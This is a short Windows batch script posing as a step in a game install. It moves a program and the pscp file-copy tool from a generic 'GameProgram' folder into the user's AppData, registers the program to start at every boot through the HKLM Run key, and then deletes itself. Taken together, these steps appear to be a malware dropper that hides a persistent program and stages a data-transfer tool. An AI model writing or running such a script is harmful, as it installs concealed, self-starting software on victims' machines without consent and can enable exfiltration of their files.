@echo off
move /y "%ProgramFiles(x86)%\Default Company Name\GenericGameName\GameProgram.exe" "\Users\%USERNAME%\AppData\Local\GameProgram.exe"
move /y "%ProgramFiles(x86)%\Default Company Name\GenericGameName\pscp.exe" "\Users\%USERNAME%\AppData\Local\pscp.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /reg:64 /v GameProgram /t reg_sz /d "\"%cd:~0,2%\Users\%USERNAME%\AppData\Local\GameProgram.exe\""
DEL "%~f0"
